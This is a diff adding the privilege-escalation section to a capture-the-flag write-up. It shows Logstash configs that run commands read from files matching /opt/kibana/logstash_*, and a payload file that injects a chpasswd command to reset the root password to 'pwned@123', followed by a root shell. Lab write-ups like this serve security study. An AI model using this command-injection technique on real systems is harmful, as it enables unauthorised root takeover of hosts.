@@ -225,3 +225,96 @@ pwd
 /
 ```
 Now we can look at the contents of those config files...
+
+## Privilege Escalation
+
+**Filter.conf**
+```
+bash-4.2$ ls
+ls
+filter.conf  input.conf  output.conf
+bash-4.2$ cat filter.conf
+cat filter.conf
+filter {
+	if [type] == "execute" {
+		grok {
+			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+		}
+	}
+}
+bash-4.2$
+```
+So this is reading some sort of message and execute it let's see another files to make more sense out of it...
+
+**Input.conf**
+```
+cat input.conf
+input {
+	file {
+		path => "/opt/kibana/logstash_*"
+		start_position => "beginning"
+		sincedb_path => "/dev/null"
+		stat_interval => "10 second"
+		type => "execute"
+		mode => "read"
+	}
+}
+```
+
+So this config is taking any file which starts with ```logstash_```  Now let's see what last config has
+
+**Output.conf**
+
+```
+cat output.conf
+output {
+	if [type] == "execute" {
+		stdout { codec => json }
+		exec {
+			command => "%{comando} &"
+		}
+	}
+}
+```
+
+It basically executing the command which it received in that ```logstash_*``` file ...
+
+#### Payload creation 
+
+So let's create a payload which will match the conditions of ```input.conf``` 
+
+```
+Payload:-echo 'Ejecutar comando : echo "root:pwned@123"|chpasswd' > logstash_haha
+```
+
+File will be created as ```logstash_haha``` and payload will change the root password to ```pwned@123```
+
+Let's quickly try this and create this file in ```/opt/kibana/``` as mentioned in ```input.conf```
+
+```
+pwd
+/opt/kibana
+bash-4.2$ echo 'Ejecutar comando : echo "root:pwned@123"|chpasswd' > logstash_haha
+<mando : echo "root:pwned@123"|chpasswd' > logstash_haha                     
+bash-4.2$ cat logstash_haha
+cat logstash_haha
+Ejecutar comando : echo "root:pwned@123"|chpasswd
+bash-4.2$
+```
+
+Now we wait for some time  also i noticed that if your payload doesn't work create another file with ```logstash_``` in the start but change the end part everytime, i might be wrong but whenever i tried to create same file again my payload will not execute...
+
+#### Root-Shell
+
+```
+[security@haystack tmp]$ su root
+Contraseña: 
+[root@haystack tmp]# id
+uid=0(root) gid=0(root) grupos=0(root) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[root@haystack tmp]# cd /root
+[root@haystack ~]#
+```
+<br/>
+<meme.gif>
+<br/>
+Finally we did it ...this ctf was really a nice one i enjoyed it well mostly because i haved used *ELK* a.k.a *elasticsearch-logstash-kibana* in my project
